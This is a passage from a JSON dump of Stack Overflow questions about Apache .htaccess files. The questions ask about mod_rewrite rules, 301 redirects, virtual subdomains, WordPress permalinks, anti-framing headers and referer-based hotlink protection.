?</p>\n"},{"tags":[".htaccess","url","mod-rewrite"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":29,"score":0,"question_id":12874121,"title":"rewriting a URL where a subfolder should not be visible","body":"<p>I have multiple domains setup with my webspace (all via a hosting provider)</p>\n\n<p>So <code>www.maindomain.com</code> links to <code>/maindomain</code> on my webspace. <code>www.domain2.com</code> links to <code>/domain2</code> on my webspace. Pretty simple so far.</p>\n\n<p>However as soon as I place another folder into one of those directories the <code>folder</code> of the domain itself gets mentioned in the <code>URL</code> again.</p>\n\n<p>So imagine this … I have a folder <code>test</code> inside <code>maindomain</code>. In that case the URL to this folder is not <code>www.maindomain.com/test</code> but <code>www.maindomain.com/domain2/test</code>. So the <code>maindomain</code> directory name that is repeated in the url. </p>\n\n<p>Why is that? Is there a way to make that go away via <code>mod_rewrite</code> and <code>.htaccess</code>?</p>\n\n<p>I found this in the <code>.htaccess</code> file on the root of my </p>\n\n<pre><code>RewriteEngine On\nRewriteCond %{REQUEST_URI} !^/maindomain/\nRewriteCond %{DOCUMENT_ROOT}/maindomain%{REQUEST_URI} -f [OR]\nRewriteCond %{DOCUMENT_ROOT}/maindomain%{REQUEST_URI} -d\nRewriteRule ^(.*)$ /maindomain/$1 [L]\n</code></pre>\n\n<p>However, since I'm not much of a server-guru I can't figure out what that actually means.\nCan someone please help me out here?</p>\n"},{"tags":["php",".htaccess","function","redirect"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":39,"score":-1,"question_id":12880340,"title":"htaccess working mechanism","body":"<p><strong>I have the folowing htaccess file:</strong></p>\n\n<pre>\nRewriteEngine on\n\nRewriteRule ^(.*)-(.*)-(.*)$   index.php?page=$1&id=$2&im=$3\n</pre>\n\n<p><strong>And inside the php page I have:</strong></p>\n\n<p>href=\"home-46-126\" //Contact Us</p>\n\n<p>href=\"home-38-129\" //News</p>\n\n<p><strong>I want to know how the redirection done?\nWhat is the function that did this redirection ?\nHow Does the website know where to go if the user clicks on \"Contact Us\" ?</strong></p>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":0,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":12880366,"title":"rewrite rule & get method not work","body":"<p>my htaccess code:</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine On\n\nRewriteCond %{REQUEST_FILENAME} !-f \nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteCond %{REQUEST_FILENAME} !-l\n\nRewriteRule ^([^/]+)$ index.php?user_com=$1 [L,NC]\nRewriteRule ^([^/]+)/([^/]+)$ index.php?user_com=$1&amp;user_opt=$2 [L,NC]\nRewriteRule ^([^/]+)/([^/]+)/([^/]+)$ index.php?user_com=$1&amp;user_opt=$2&amp;user_id=$3 [L,NC]\n\nRewriteRule ^([^/]+)/$ index.php?user_com=$1 [L,NC]\nRewriteRule ^([^/]+)/([^/]+)/$ index.php?user_com=$1&amp;user_opt=$2 [L,NC]\nRewriteRule ^([^/]+)/([^/]+)/([^/]+)/$ index.php?user_com=$1&amp;user_opt=$2&amp;user_id=$3 [L,NC]\n</code></pre>\n\n<p></p>\n\n<p>this code not work when use this method:</p>\n\n<p>www.sitename.com/user/profile/?id=20&amp;name=bank</p>\n\n<p>$_GET['id'] &amp; $_GET['name'] NULL!</p>\n"},{"tags":["javascript",".htaccess","iframe","meta"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":78,"score":1,"question_id":12880165,"title":"How to redirect to error page if iframe is used by other domain to show my Website","body":"<p>Recently my websites content is being stolen by lots of other websites.</p>\n\n<p>What they do is just create an iframe of my website and show specific data on their domain to get high traffic. When I found out, I tried to block it with <code>htaccess</code> and <code>meta</code> tags.</p>\n\n<p>My webpage that they abuse is an html page which contains an iframe from a subdirectory. \nThey don't use that iframe instead they target other contents of html page but my technique to block does not work in Firefox and it blocks my iframe also. It works fine in Google Chrome and Internet Explorer.</p>\n\n<p>My <code>.htaccess</code> settings - works on Firefox but not on Google chrome and Internet explorer, and also it doesn't show my iframe from same domain:</p>\n\n<pre><code>Header set X-Frame-Options DENY\nHeader always append X-Frame-Options SAMEORIGIN\n</code></pre>\n\n<p>My Meta settings - this works on all browser except Firefox:</p>\n\n<pre><code>&lt;meta http-equiv=\"X-Frame-Options\" content=\"deny\"&gt;\n</code></pre>\n\n<p>I have done this temporarily to block my content to use on other websites. \nI want something like a redirect to my custom page, or when user click inside frame it redirects. Any better ideas are welcome.</p>\n"},{"tags":["php",".htaccess","mod-rewrite","localhost"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":47,"score":2,"question_id":12645564,"title":"RewriteRule explanation","body":"<p>Could anyone explain the following two lines please?</p>\n\n<pre><code>RewriteEngine on\nRewriteRule ^(.*)-(.*)-(.*)$   index.php?page=$1&amp;id=$2&amp;im=$3\n</code></pre>\n\n<p>I hope to be a detailed explanation because I do not have any idea about the .htaccess file.</p>\n\n<p>any body can help me? I appreciate any suggestions ..\nthank you ..</p>\n"},{"tags":["php","javascript","security",".htaccess","captcha"],"answer_count":4,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":79,"score":1,"question_id":12770875,"title":"Create a unreadable PHP page for capthca","body":"<p>I'm using the cool-captcha for my registration form. \nThis is the Captcha generated picture code which I'm using inside my codes:</p>\n\n<pre><code>&lt;img src=\"captcha.php\" id=\"captcha\" /&gt;\n</code></pre>\n\n<p>Anyone can directly go to \"captcha.php\" page and view the image. So my question is, is there anyway to disable the direct access or direct viewing of Captcha.php in browser ? I just want the Captcha.php can only be used to view inside the img source not in direct viewing by browsers. Is there anyway to do in php or htaccess file ?</p>\n\n<p>Thanks</p>\n"},{"tags":["apache",".htaccess"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":76,"score":1,"question_id":12877611,"title":".htaccess to restrict access from all except one specific url","body":"<p>I'm using a membership script to allow access to private files by a group of people. The problem is anyone who knows the link to the files can easily bypass the membership script and have direct access to the files. My goal is to prevent direct URL access through <code>http://domain.com/folder1/folder2/index.php</code> and to only accept access from <code>http://domain.com/folder1/file_with_link_to_index.php</code>. The membership script is useless unless I can prevent people typing in the url to the file locations.</p>\n\n<p>I'm having a hard time even beginning to understand Apache but what I was attempting to do was to use \"Deny All\" and then \"Allow from <code>http://folder1/file_with_link_to_index.php</code>.\" so that access to the files could only be access through the \"file_with_link~\" only. It didn't work. I was still able to paste the url to the files into the browser and access the directory.</p>\n\n<p>I found similar questions on StackO but not enough experience to understand and actually take the little pieces that were similar to my problem and actually use them. It's probably something simple but I'm so frustrated with trying to figure this out that I can't see it.</p>\n\n<p>Here's a quick example of what I was trying to use:</p>\n\n<h1>deny all except those indicated here</h1>\n\n<pre><code>&lt;Limit GET POST PUT&gt;\n order deny,allow\n deny from all\n allow from 12.345.67.890\n allow from http://domain.com/fold1/LINKING_FILE/program_index.php\n&lt;/Limit&gt;\n</code></pre>\n\n<p>I'm pretty sure I'm failing on the way the domain is supposed to be written and maybe that's why it's not working?</p>\n"},{"tags":[".htaccess","redirect","subdomain"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":94,"score":1,"question_id":12873283,"title":"Rewrite virtual subdomain to subfolder and keep original url","body":"<p>I searched across the web for a few days now but I didn't found any anwser to my question. This is what I want to do:</p>\n\n<p>Every user on my site recieves a personal subdomain like <a href=\"http://username.domain.com\" rel=\"nofollow\">http://username.domain.com</a>.\nOff course this is a virtual subdomain.</p>\n\n<p>Now, I already set up a wildcard DNS A record, turn mod_rewrite ON and achieved to do this:</p>\n\n<p>When somebody surfs to http:// anysubdomain.domain.com they are redirected to http:// www.domain.com/sub/index.php?var=anysubdomain. In the index.php there's a function that gets unique information based on the 'var' variable (the name of the subdomain).</p>\n\n<p>What I want to do is when somebody is surfing to http:// anysubdomain.domain.com he's redirected to http:// www.domain.com/sub/index.php?var=anysubdomain (like it is now) but that the orginal URL (http:// anysubdomain.domain.com) is kept in the browser bar. So it really looks like every user has his own subdomain.</p>\n\n<p>This is the htaccess file I currently use:</p>\n\n<pre><code>RewriteEngine On \nOptions +FollowSymlinks \n\n\nRewriteCond %{HTTP_HOST} !^www\\.domain\\.com\nRewriteCond %{HTTP_HOST} !^static\\.domain\\.com\nRewriteCond %{HTTP_HOST} ^(www\\.)?(.+)\\.domain.com$ [NC] \nRewriteRule ^(.*)$ http://www.domain.com/sub/index.php?username=%2 [L]\n</code></pre>\n\n<p>I hope everything is clear, if not: ask and I provide more information!</p>\n\n<p>Thanks in advance!</p>\n\n<p>Yuri</p>\n"},{"tags":["regex",".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":30,"score":1,"question_id":12876070,"title":"htaccess Rewrite rule based on first two second two characters","body":"<p>This should be fairly easy for all regex gurus, however we are having issues with it.</p>\n\n<p>We made a mistake by allowing people to upload images to one folders. Now we are stuck with 150k jpg images in just one folder and its slowing our server a lot.</p>\n\n<p>people are still allowed to upload to this very folder (live site) and we need to fix this slowly. the idea is to move files to subfolders like this:</p>\n\n<p><code>/jpg/121765_180x135.jpg</code>      to        <code>/jpg/12/17/121765_180x135.jpg</code></p>\n\n<p>first two/second two chars/file.jpg</p>\n\n<p>the thing is that files with less than 4 chars should stay where they are</p>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":39,"score":0,"question_id":12877296,"title":"mod_rewrite disabling old link","body":"<p>I have a folder \"journals\" inside my public_html.So my links are like this:</p>\n\n<p><code>site/journals/index.php/journal1</code>, <code>site/journals/index.php/journal2</code> etc.(journal1,journal2 are just illustration.It might be technology,arts etc.)</p>\n\n<p>I have(with help of Jon) .htaccess which is making <code>site/journals/index.php/journal1</code> to appear as <code>site/index.php/journal1</code>.</p>\n\n<p>But I am still able to access/view- <code>site/journals/index.php/journal1</code>.</p>\n\n<p>I want to disable <code>site/journals/index.php/journal1</code> and only <code>site/index.php/journal1</code> should be visible.Please let me know how can I do that.</p>\n\n<p>Please check <a href=\"http://stackoverflow.com/questions/12862809/mod-rewrite-remove-folder-name-from-url\">this</a> for more info.</p>\n\n<p>Here is the existing .htaccess in root(/) folder</p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine On\nRewriteCond %{REQUEST_URI} !^/sunder\nRewriteRule ^index\\.php(.*)$ /sunder/index.php$1? [L]\n&lt;/IfModule&gt;\n</code></pre>\n"},{"tags":[".htaccess","redirect","http-status-code-301"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":12877587,"title":"Which .htaccess file should I be using for 301 redirects?","body":"<p>This is one of those super-simple questions that I can't seem to google an answer for, so apologies in advance.</p>\n\n<p>When I ftp into my (shared) server, I have a file structure like this:</p>\n\n<p><ul>\n<li>Root (/)</p>\n\n<ul>\n<li>/public_html\n<ul><ul>\n<li>/newdomain.com</li>\n</ul></ul>\n</li>\n</ul>\n\n<p></li></p>\n\n<p>I had an old website that lived in /public_html, it had heaps of content and excellent SEO. We changed our name and our domain (which lives in /newdomain.com, a folder inside /public_html), and set 301 redirects from all the old content to the new website.</p>\n\n<p>I tried doing this myself, but it didn't work at all, so I got my host's techsupport to do it for me. There are several .htaccess files on my server though, and I don't know which ones are actually effective and which aren't.</p>\n\n\n<li>Root has its own .htaccess file</li>\n<li>public_html has its own .htaccess file</li>\n<li>/newdomain.com DOESN'T have its own .htaccess file</li>\n</ul>\n\n<p><strong>Redirection 1</strong> (currently is in both root and public_html's .htaccess files, and <strong>works</strong>)</p>\n\n<p>I want to redirect <a href=\"http://olddomain.com/whatever\" rel=\"nofollow\">http://olddomain.com/whatever</a> -> <a href=\"http://newdomain.com/whatever\" rel=\"nofollow\">http://newdomain.com/whatever</a> (I've currently got each individual page doing its own separate 301 versus a single rule doing this). Achieved with <code>Redirect 301 /article-name-here/ http://www.newsite.com/article-name-here/</code></p>\n\n<p><strong>Redirection 2</strong> (currently is in both root and public_html's .htaccess files, and <strong>doesn't work</strong>). </p>\n\n<p>I also want to do some internal redirections of <a href=\"http://newdomain.com/oldpage.html\" rel=\"nofollow\">http://newdomain.com/oldpage.html</a> -> <a href=\"http://newdomain.com/newpage.html\" rel=\"nofollow\">http://newdomain.com/newpage.html</a>. I've tried redirection public_html's .htaccess file like so:</p>\n\n<pre><code>Redirect 301 http://newsite.com/badpage.html http://newsite.com/goodpage.html\n</code></pre>\n\n<p>But it's not working. Do I need to set up a new .htaccess in the newsite.com folder on my server? Or am I just completely missing the mark here?</p>\n"},{"tags":[".htaccess","caching","apache2","gzip","deflate"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":319,"score":2,"question_id":2746965,"title":"Apache server-side files caching via .htaccess?","body":"<ol>\n<li><p>I'm starting new website and gonna include several JS libs and would like to know how <strong>.htaccess</strong> file template should look like with <strong>caching</strong> of media and JS files on?</p></li>\n<li><p>Whats better for compression, <strong>GZip</strong> or <strong>Deflate</strong>?</p></li>\n<li><p>Is it better/faster solution to serve those JS libs off the Google CDN perhaps then locally?</p></li>\n</ol>\n\n<p>I'm asking CDN question since some of scripts served off GoogleCDN are potentially going to update and eventually break the website layout so i thought it would be better for me to host them locally and cache via webserver if its going to work with same/near-same speed.</p>\n"},{"tags":["apache",".htaccess","magento"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":53,"score":0,"question_id":12863407,"title":"How can I allow specific URL in htaccess?","body":"<p>My root .htaccess in a Magento store ensures that any visits not written as <code>(www.)domain.com/correct</code> will go to our 404 (where \"correct\" is an existing sub-directory). <code>(www.)domain.com/admin</code> is also allowed through.</p>\n\n<p>I now need to also allow some other URLs that do not follow the <code>(www.)domain.com/correct</code> form.</p>\n\n<p>Presently the code in the .htaccess is:</p>\n\n<pre><code>RewriteCond %{HTTP_HOST} ^domain.com$ [NC] \nRewriteRule ^(.*)$ http://www.domain.com/$1 [R=301,L]\n\nRewriteCond %{HTTP_HOST} ^www.domain.com$ [NC] \nRewriteRule ^$ go404 [R=301,L]\n</code></pre>\n\n<p>How can I make the following go through as well (ie NOT go404 on me)?</p>\n\n<pre><code>www.domain.com/correct/index.php/folder1/folder2/folder3/\n</code></pre>\n"},{"tags":["php","html",".htaccess"],"answer_count":5,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":82,"score":1,"question_id":12872614,"title":"Moving a HTML site to PHP","body":"<p>I currently run a site with 750 pages of .html webpages (yeah I know it was a stupid idea, but I'm a novice). I'm looking to move these to php. I don't really want to set up 750 individual 301 redirects and rewrite each page to .php</p>\n\n<p>I've heard that I can use htaccess to this. Anyone know how?</p>\n\n<p>A few additional questions - </p>\n\n<ol>\n<li>Can I permanently redirect these links from html to php without losing my search engine rankings and </li>\n<li>if I want to add php to each of the files (i.e. a php file menu (using the include command) to make the links quicker to update will this work? Because won't they still be html files?</li>\n</ol>\n\n<p>Sorry for the stupid questions, but I'm still learning.</p>\n"},{"tags":[".htaccess","development-environment","local","production-environment","xammp"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":18,"score":0,"question_id":12877000,"title":"Issues with XAMMP local development","body":"<p>During offline development I use XAMPP/Win7 enviroment, and then everything is sent online for production at the apache server.</p>\n\n<p>I Currently use aliases for working with projects under different paths other than the default C:/xampp/htdocs. Tough apparently this does not particularly affect the following issues I've found during development:</p>\n\n<ul>\n<li><p>Absolute paths doesn't work:\nOn different projects (e.g. \"localhost/projectA\", \"localhost/projectB\") absolute paths (/) point to localhost, so they don't work, files doesn't get loaded because they aren't found. In order to \"fix\" this, it's better to avoid them, but there are even times when you simply can't. Like in the site's logo hyperlink (src=\"/\") which while in production It works fine, It's also pretty anoying during development, because you cannot return to homepage.</p></li>\n<li><p>htaccess doesn't works either:\nFor some reason it works online, but cannot make it work offline. So things like 404 error pages are not available during development, but after publishing.</p></li>\n</ul>\n\n<p>I'd like to know if some has met this issues and has any idea in how to circunvent them. Thanks</p>\n"},{"tags":["apache",".htaccess","redirect","subdomains"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":45,"score":1,"question_id":12876620,"title":"Converting multiple subdomains (both http and https) to www.domain.com using .htaccess","body":"<p>I've got a dozen old subdomains that have been indexed by Google.  Not only have parts of my site been indexed, but they have been indexed as both http AND https.</p>\n\n<p>I've managed to redirect all the subdomains properly, provided they are not https, but can't get any of the https subdomains to property redirect.</p>\n\n<p>Here's the code I'm using:</p>\n\n<pre><code>RewriteCond %{HTTP_HOST} ^subdomain1.mysite.com$ [NC]\nRewriteRule ^(.*)$ http://www.mysite.com/$1 [R=301,L]\n\nRewriteCond %{HTTP_HOST} ^subdomain2.mysite.com$ [NC]\nRewriteRule ^(.*)$ http://www.mysite.com/$1 [R=301,L]\n\nRewriteCond %{HTTP_HOST} ^subdomain3.mysite.com$ [NC]\nRewriteRule ^(.*)$ http://www.mysite.com/$1 [R=301,L]\n</code></pre>\n\n<p>This works great until someone goes to: <a href=\"https://subdomain2.mysite.com\" rel=\"nofollow\">https://subdomain2.mysite.com</a>$ which is not redirected back to <a href=\"http://www.mysite.com\" rel=\"nofollow\">http://www.mysite.com</a>$</p>\n\n<p>How can I get this to work?  Additionally, I'm guessing there is an easier way to make it happen than setting up a dozen pairs of Rewrite conditions/rewrite rule? Is there any way to do this in just a few lines, including one where I list all the subdomains?</p>\n\n<p>Any suggestions would be great, and yes, I've gone through a few dozen threads here looking for the answer and have tested various tips offered, though none of the questions I saw pertained to this exact situation.</p>\n\n<p>Thank you!</p>\n"},{"tags":["wordpress",".htaccess","wordpress-plugin","permalinks"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":69,"score":0,"question_id":12870095,"title":"WordPress plugin links not working","body":"<p>I'm developing a plugin with the latest version of WordPress (3.4.2) locally (XAMPP 1.7.7 [PHP: 5.3.8]) and for some reason the links are not working within the plugin. I just have a simple delete link that links to a 'delete-gallery.php' file from within the plugin admin page. This file (delete-gallery.php) only calls a function to delete the record from the database and redirects back to the page that called it (the plugin admin page). Simple enough. But, when the link is clicked I get directed to XAMPP root (localhost:8080/xampp) and not the requested destination (delete-gallery.php) for some reason.</p>\n\n<pre><code>$url = plugins_url('includes/delete-gallery.php', _FILE_);\necho '&lt;a href=\"'.$url.'?gallery_id='.$gallery['gallery_id'].'\"&gt;Delete&lt;/a&gt;';\n</code></pre>\n\n<p>I know the hrefs' path is correct on the link because it shows up in the status bar on hover, but for some reason it's not locating the file locally on submission. If I set the destination to somewhere external (ie. google.com, etc) it works fine, but not locally within wordpress.</p>\n\n<p>The permalink structure has been updated and the .htaccess file is currently as so: </p>\n\n<pre><code># BEGIN WordPress\n&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine On\nRewriteBase /\nRewriteRule ^index\\.php$ - [L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule . /index.php [L]\n&lt;/IfModule&gt;\n# END WordPress\n</code></pre>\n\n<p>If I use a blank .htaccess file I don't get redirected to the XAMPP root, but instead get the error 'Object not found! The requested URL was not found on this server. ...' when the link is clicked.</p>\n\n<p>Is there something that needs to be set in .htaccess to allow redirecting locally within wordpress? I'm at a loss here. Any suggestions would be greatly appreciated.</p>\n"},{"tags":["php","wordpress",".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":5,"down_vote_count":0,"view_count":74,"score":5,"question_id":12872925,"title":".htaccess redirecting broken URLs","body":"<p>I updated a website but the links doesn't work properly anymore. I have some urls but they don't work anymore:</p>\n\n<pre><code>http://www.mysite.eu/fr/some-page\nhttp://www.mysite.eu/fr/some-page1\nhttp://www.mysite.eu/fr/some-page2\n</code></pre>\n\n<p>Is it possible to redirect the page when there is an <code>/fr/</code> in the url? \nI've tried </p>\n\n<pre><code>Redirect 301 /fr/ http://www.mysite.eu/\n</code></pre>\n\n<p>but that only strips the <code>/fr/</code>.</p>\n"},{"tags":["wordpress",".htaccess","http","redirect","subdomain"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":47,"score":1,"question_id":12871814,"title":"Move a wordpress blog, redirect all old indexed links to subdomain","body":"<p>I have a wordpress blog at 'mydomain.com' and I want to redirect everything on it to a new subdomain 'old.mydomain.com' so I can start over from scratch with static blogging (scriptogr.am). What's the easiest way to accomplish that?</p>\n\n<p>Thanks!</p>\n"},{"tags":["apache",".htaccess","mod-rewrite","query-string"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":54,"score":2,"question_id":12873137,"title":"How can I mod_rewrite and keep query strings?","body":"<p>I want to mod_rewrite a URL to another page, but then I also want any query strings added to be preserved.</p>\n\n<pre><code>RewriteEngine On\n\n#enforce trailing slashes\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_URI} !#\nRewriteCond %{REQUEST_URI} !(.*)/$\nRewriteRule ^(.*)$ http://localhost/siteroot/$1/ [L,R=301]\n\nRewriteRule ^apps/([A-Za-z0-9-_]+)/?$ index.php&amp;app=$1\n</code></pre>\n\n<p>So if a user visits <code>apps/app1/</code>, <code>index.php?app=app1</code> is shown.\nHowever, I want to be able to preserve optional query strings, so that visiting <code>apps/app1/?variable=x</code> returns <code>index.php?app=app1&amp;variable=x</code>.</p>\n\n<p>What mod_rewrite rule/condition would make this happen?</p>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":12872329,"title":"how to rewrite and add a new parameter in .htaccess","body":"<p>i want rewrite a url to another using mod_rewrite.. but i want to preserve the query parameters and and POST data even after the rewrite.\nAnd i want to add a new parameter to the url when rewriting it...\nFor example</p>\n\n<p>This ->  <a href=\"http://example.com/test/?user=234343\" rel=\"nofollow\">http://example.com/test/?user=234343</a></p>\n\n<p>To -> <a href=\"http://example.com/othertest/user=234343&amp;new_param=CUSTOM_VALUE\" rel=\"nofollow\">http://example.com/othertest/user=234343&amp;new_param=CUSTOM_VALUE</a>    //i'll just type this value in the .htaccess file</p>\n\n<p>It will be very helpful if anyone could show me an example how to do it.</p>\n"},{"tags":["php","javascript",".htaccess","random"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":40,"score":1,"question_id":12870319,"title":"Wildcard Url Pattern using htaccess","body":"<p>i am looking for htaccss code. i want like if some one vist</p>\n\n<pre><code>domain.com/folder/ver-234123.html\ndomain.com/folder/ver-4234234.html\ndomain.com/folder/ver-kahsdkf.html\n</code></pre>\n\n<p>so it all baiscally open <code>domain.com/folder/index.php</code>  </p>\n\n<p>i will randomize the number/digits after ver- via php.</p>\n"},{"tags":["linux","apache",".htaccess","mod-rewrite","url-rewriting"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":41,"score":0,"question_id":12868378,"title":"how to remove dot in an url through htaccess","body":"<p>I'm getting 403 Access Forbidden error for certain urls.  I found the root cause of the issue. wherever there is a dot(.) in an url, i'm getting the 403 forbidden.</p>\n\n<p>There are thousands of urls have been indexed by google and hence i wanted to resolve via htaccess.</p>\n\n<p>For e.g</p>\n\n<p>I want to remove (dot) for the following url</p>\n\n<p>FROM</p>\n\n<pre><code>http://www.example.com/zero/one/two/three/four/five/six./seven/eight.html\n</code></pre>\n\n<p>TO</p>\n\n<pre><code>http://www.example.com/zero/one/two/three/four/five/six/seven/eight.html\n</code></pre>\n"},{"tags":["php",".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":47,"score":0,"question_id":12868479,"title":"rewrite to friendly urls php","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/3655893/rewriting-an-arbitrary-number-of-path-segments-to-query-parameters\">Rewriting an arbitrary number of path segments to query parameters</a>  </p>\n</blockquote>\n\n\n\n<p>htaccess` rewrite but im not sure on how to rewrite multiple address gets</p>\n\n<p>I developed a forum from scratch and would like to change </p>\n\n<p><code>url = view_topic.php?cat=$cat&amp;sub=$sub&amp;tid=$tid</code></p>\n\n<p>to say </p>\n\n<p><code>view_topic.php?catname/subname/topicname</code></p>\n\n<p>some help would be great</p>\n"},{"tags":[".htaccess","redirect","drupal-7"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":12867922,"title":"301 redirect for certain non-html files","body":"<p>I want to do a redirect for certain files that do not end in html, but not all files on my site.  Here is what I have:</p>\n\n<p>This is in Drupal.  For example, for www.mysite.com/test, I want to redirect to www.mysite.com/test.html</p>\n\n<p>Here is what I have.  I'm not sure if it's a Drupal issue, or not.  </p>\n\n<pre><code>RewriteRule ^test!\\.html$ http://www.mysite.com/test.html [R=301,L]\n</code></pre>\n"},{"tags":["wordpress",".htaccess","redirect"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":12867595,"title":"Redirect all wordpress subpage to index (but only for desktop users)","body":"<p>I need to redirect all wp subpage to index only for desktop users.</p>\n\n<p>I have now this .htaccess:</p>\n\n<pre><code># BEGIN WordPress\n&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine On\nRewriteBase /\nRewriteRule ^index\\.php$ - [L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule . /index.php [L]\n\n&lt;/IfModule&gt;\n\n# END WordPress\n</code></pre>\n\n<p>I don't have knowledge about .htaccess. Any help is appraciated.</p>\n\n<p>Thanks</p>\n"},{"tags":["php",".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":12867419,"title":"302 htaccess redirect from old php page to new url","body":"<p>Let say I have an old URL <a href=\"http://abc.com/x.php?a=xyz&amp;b=jkl\" rel=\"nofollow\">http://abc.com/x.php?a=xyz&amp;b=jkl</a> I need to redirect all the request to page x.php either having query string or not to <a href=\"http://xyz.com/x/\" rel=\"nofollow\">http://xyz.com/x/</a></p>\n\n<p>Below is the .htaccess file which is present in root of <a href=\"http://xyz.com\" rel=\"nofollow\">http://xyz.com</a> </p>\n\n<pre><code># Turn on URL rewriting\nRewriteEngine On\n\nRewriteBase /\n\n# Protect application and system files from being viewed\nRewriteRule ^(application|modules|system) - [F,L]\n\n# Allow any files or directories that exist to be displayed directly\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteCond $0 !=server-status\n\n\n# Rewrite all other URLs to index.php/URL\nRewriteRule .* index.php/$0 [PT,L]\n</code></pre>\n"},{"tags":["wordpress",".htaccess","permissions"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":12865990,"title":".htaccess rewrite issue only loading homepage","body":"<p>I have moved a site from my test dev to a live server (its wordpress) and for some reason no matter what page I click on only the homepage loads.</p>\n\n<p>Think I have narrowed it down to my htaccess file:</p>\n\n<pre><code># BEGIN WordPress\n&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine On\nRewriteBase /\nRewriteRule ^index\\.php$ - [L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule . /index.php [L]\n&lt;/IfModule&gt;\n\n# END WordPress\n</code></pre>\n\n<p>and this line in particular:</p>\n\n<pre><code>RewriteRule . /index.php [L]\n</code></pre>\n\n<p>If I remove this or remove the htaccess completly I get a Forbidden 403 error.</p>\n\n<p>I was hoping someone could help me figure this out?!</p>\n"},{"tags":[".htaccess","iis","http-referer"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":38,"score":1,"question_id":12817802,"title":"Check HTTP_REFERER on a Windows server","body":"<p>I'm currently migrating from a Linux (Apache) server to Windows (IIS). On Linux I'm using a .htaccess file to check the HTTP_REFERER value, to ensure our files are only being loaded from our site, and not linked to from other sites:</p>\n\n<pre><code>RewriteEngine on\nRewriteCond %{HTTP_REFERER} !^http(s)?://(www\\.)?foo.com [NC]\nRewriteRule \\.(dcr)$ - [NC,F,L]\n</code></pre>\n\n<p>How can I accomplish this on a Windows machine? (Windows Server 2008 R2, IIS 7)</p>\n"},{"tags":["php","apache",".htaccess","httpd"],"answer_count":2,"favorite_count":0,"up_vote_count":6,"down_vote_count":0,"view_count":89,"score":6,"question_id":12865780,"title":"mod_rewrite exception for a specific file","body":"<p>My page is not redirecting as it should due to my .htaccess file which is set as:</p>\n\n<pre><code>RewriteEngine on  \nRewriteCond $1 !^(index\\.php|resources|robots\\.txt)  \nRewriteCond %{REQUEST_FILENAME} !-f  \nRewriteCond %{REQUEST_FILENAME} !-d  \nRewriteRule ^(.*)$ index.php/$1 [L,QSA]   \n</code></pre>\n\n<p>I use this setup for my MVC Framework so i get urls like  <code>/controller/method/argument</code> however when I redirect to /forum/login.php it cuts to /forum/.</p>\n\n<p>How can I add this as an exception so that i will be able to redirect to <code>/forum/login.php</code></p>\n\n<p>I found another .htaccess in my /forum/ directory could this be causing the problem as well?</p>\n\n<pre><code># BEGIN PunBB\n\n&lt;IfModule mod_rewrite.c&gt;\n    # MultiViews interfers with proper rewriting\n    Options -MultiViews\n\n    RewriteEngine On\n\n    # Uncomment and properly set the RewriteBase if the rewrite rules are not working properly\n    #RewriteBase /\n\n    RewriteCond %{REQUEST_FILENAME} !-f\n    RewriteCond %{REQUEST_FILENAME} 